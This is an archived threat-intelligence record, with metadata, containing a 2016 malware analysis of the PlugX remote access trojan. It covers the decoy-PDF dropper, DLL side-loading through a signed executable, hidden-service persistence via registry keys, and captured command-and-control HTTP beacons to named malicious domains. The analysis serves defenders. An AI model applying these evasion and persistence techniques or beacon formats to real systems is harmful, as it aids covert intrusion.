{
    "id": "cc0881f8-516d-4dc1-921a-7806b0e2e617",
    "created_at": "2023-01-12T14:59:07.512905Z",
    "updated_at": "2025-03-27T02:05:30.703749Z",
    "deleted_at": null,
    "sha1_hash": "0ba4331ab77fdf2320e40a8cd7ef107e58ac3957",
    "title": "2016-01-22 - PlugX APT Malware",
    "authors": "",
    "file_creation_date": "2022-05-28T19:05:39Z",
    "file_modification_date": "2022-05-28T19:05:39Z",
    "file_size": 975176,
    "plain_text": "# NetWitness Community\n\n**community.rsa.com/thread/185439**\n\n**Information**\n\nMalware Family/Aliases: PlugX\n\nMalware Type: Trojan/Backdoor:Win32\n\nPlatform: Windows\n\nMD5:  b9501109bd94ac243f22aec5aca65ace\n\nSHA1: b2b2a14983b13f966b3bfeb2ba33c3dd64a69ded\n\n\nJanuary 22, 2016\n\n\nSHA256: a3c4cb110064086fd7491d9cf5ffd7552384916c92effca20c8b16dfc625f37b\n\nDiscovery Date: 2008\n\n**Summary**\n\nPlugX is a RAT (Remote Access Trojan) malware family that is around since 2008 and is\nused as a backdoor to fully control the victim's machine. Once the machine is infected, a\ncybercriminal can remotely execute several kinds of commands on the affected system.\n\nNotable features of this malware family is the ability to execute commands on the affected\nmachine in order to retrieve machine information, capture the screen, send keyboard and\nmouse events, key logger, reboot the system, manage processes (create, kill and\nenumerate), manage services (create, start, stop, etc.), manage Windows registry entries,\nopen a shell, etc.\n\nThe malware also logs its own events in a text log file, probably in an attempt to enhance\nitself.\n\n**Malware Installation**\n\nThis sample is a Windows Self-Extracting Archive that contains a legitimate PDF document\nfile along with the malware dropper (a regular PE32 executable file for MS Windows).\n\nOnce executed, the sample extracts the PDF document and the dropper file to the temp\nfolder:\n\n%Temp%\\1.pdf\n%Temp%\\1.exe\n\n\n-----\n\nThe malware then opens and displays the legitimate PDF document, making the victim\nbelieve that this is the only content and purpose of the self-extracting file:\n\nRight after that, the dropper file is executed. It drops the following files on the affected\nsystem:\n\n%ALLUSERSPROFILE%\\SxSi\\rc.exe\n%ALLUSERSPROFILE%\\SxSi\\rcdll.dll\n%ALLUSERSPROFILE%\\SxSi\\rc.hlp\n\nAnd creates a new instance of %WINDIR%\\system32\\svchost.exe (Windows generic host\nprocess for services that run from dynamic-link libraries), which creates an instance of\n_%WINDIR%\\system32\\msiexec.exe (Windows installer component)._\n\nThe dropper then executes %ALLUSERSPROFILE%\\SxSi\\rc.exe, a clean and legitimate\nsigned executable file - which loads %ALLUSERSPROFILE%\\SxSi\\rcdll.dll, a malicious\ndynamic-link library used as a loader. The loader decrypts the encrypted payload in the\nmalicious binary file %ALLUSERSPROFILE%\\SxSi\\rc.hlp and injects it in both newly created\n_%WINDIR%\\system32\\svchost.exe and %\\system32\\msiexec.exe processes._\n\nAs result, malicious code is injected and running in system processes:\n\n\n-----\n\nOnce running, the malware creates a hidden log file to trace information and errors during its\nexecution, probably in an attempt by the authors to enhance it:\n\n%ALLUSERSPROFILE%\\SxSi\\bug.log\n\n\n-----\n\nIt is worth to mention that malware installation procedures, filenames, locations and other\ndetails may vary depending on the analyzed sample.\n\n## Malware Persistency Techniques\n\nThe malware installs itself as a Windows service and is configured to automatically start\nduring Windows startup (start type equals to “2”) to make itself persistent:\n\nHKLM\\SYSTEM\\ControlSet001\\Services\\SxSi\\Start: 0x00000002\n\nHKLM\\SYSTEM\\ControlSet001\\Services\\SxSi\\ImagePath: \"\"C:\\Documents and Settings\\All\nUsers\\SxSi\\rc.exe\" 200 0\"\n\nHKLM\\SYSTEM\\ControlSet001\\Services\\SxSi\\DisplayName: \"SxSi\"\n\nHKLM\\SYSTEM\\ControlSet001\\Services\\SxSi\\ObjectName: \"LocalSystem\"\n\nHKLM\\SYSTEM\\ControlSet001\\Services\\SxSi\\Description: \"SxSi\"\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\SxSi\\Start: 0x00000002\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\SxSi\\ImagePath: \"\"C:\\Documents and\nSettings\\All Users\\SxSi\\rc.exe\" 200 0\"\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\SxSi\\DisplayName: \"SxSi\"\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\SxSi\\ObjectName: \"LocalSystem\"\n\n\n-----\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\SxSi\\Description: SxSi\n\n## Malware Protective Mechanisms\n\nTo protect the dropped files, the malware installs itself as a hidden Windows service/driver:\n\n\n-----\n\n-----\n\nAs result, the malware will run as a service and automatically start during Windows startup,\nhowever the victim will not be able to see it in the list of running services.\n\nThe malware also drops three files, including a legitimate signed executable files that loads\nthe encrypted malicious code, thus making it difficult to be detected by AV.\n\nFinally, the malware keeps all its related files encrypted while in the disk, only being\nunencrypted in the memory when injected in system processes, making it difficult to be\ndetected by static analysis tools.\n\n**Method of Infection**\n\nThe malware spreads through phishing attacks by email containing malicious attachments.\n\n\n-----\n\n**Network Behavior**\n\nThe malware can communicate to the server using TCP, UDP and HTTP protocols. Data\nsent to the server is encrypted.\n\nThe malware also uses GET and POST requests as following:\n\nPOST /729B25885FCE4CEBF4D6F20C HTTP/1.1\n\nAccept: */*\n\n**IXP: 0**\n\n**IXL: 0**\n\n**IXK: 61456**\n\n**IXN: 1**\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)\n\nHost: jessler.memsanyber.net\n\nContent-Length: 0\n\nConnection: Keep-Alive\n\n\n-----\n\nCache-Control: no-cache\n\nPOST /C377A9DC73D84FEF7349A58C HTTP/1.1\n\nAccept: */*\n\n**HHV1: 0**\n\n**HHV2: 0**\n\n**HHV3: 61456**\n\n**HHV4: 1**\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)\n\nHost: scqf.bacguarp.com:443\n\nContent-Length: 0\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nPOST /update?id=000f9098 HTTP/1.1\n\nAccept: */*\n\n**X-Session: 0**\n\n**X-Status: 0**\n\n**X-Size: 61456**\n\n**X-Sn: 1**\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)\n\nHost: vip.kavupdate.com:443\n\nContent-Length: 0\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nPOST /13A993D31022841E6C9C4EB6 HTTP/1.1\n\nAccept: */*\n\n\n-----\n\n**HIV: 0**\n\n**HIVV: 0**\n\n**HIVVV: 61456**\n\n**HIVVVV: 1**\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)\n\nHost: msn.catalogipdate.com:53\n\nContent-Length: 0\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nPOST /090DB573674F2C559858D073 HTTP/1.1\n\nAccept: */*\n\n**ASH-1.0: 0**\n\n**ASH-1.1: 0**\n\n**ASH-1.2: 61456**\n\n**ASH-1.3: 1**\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)\n\nHost: syesv.qpoe.com\n\nContent-Length: 0\n\nConnection: Keep-Alive\n\nCache-Control: no-cache\n\nGET /gamedownloader/000045/dlpacker_ver.txt?time=1449142606 HTTP/1.1\n\nHost: servers.youxi.xunlei.com\n\nCache-Control: no-cache\n\nGET /DPV?gs=minidownloader&op=1&pid=&gameid=000045&src=0&time=1449142603\nHTTP/1.1\n\n\n-----\n\nHost: gamestat.youxi.xunlei.com\n\nCache-Control: no-cache\n\nGET /mmpdd/sites/default/files/field/moigov.exe HTTP/1.1\n\nAccept: */*\n\nAccept-Encoding: gzip, deflate\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0)\n\nHost: www.moi.gov.mm\n\nConnection: Keep-Alive\n\n**Security Analytics Solution**\n\n[More details can be found here.](https://community.rsa.com/thread/185438)\n\n## Researchers\n\nNorton Santos\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-01-22 - PlugX APT Malware.pdf"
    ],
    "report_names": [
        "2016-01-22 - PlugX APT Malware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535547,
    "ts_updated_at": 1743041130,
    "ts_creation_date": 1653764739,
    "ts_modification_date": 1653764739,
    "files": {
        "pdf": "https://archive.orkl.eu/0ba4331ab77fdf2320e40a8cd7ef107e58ac3957.pdf",
        "text": "https://archive.orkl.eu/0ba4331ab77fdf2320e40a8cd7ef107e58ac3957.txt",
        "img": "https://archive.orkl.eu/0ba4331ab77fdf2320e40a8cd7ef107e58ac3957.jpg"
    }
}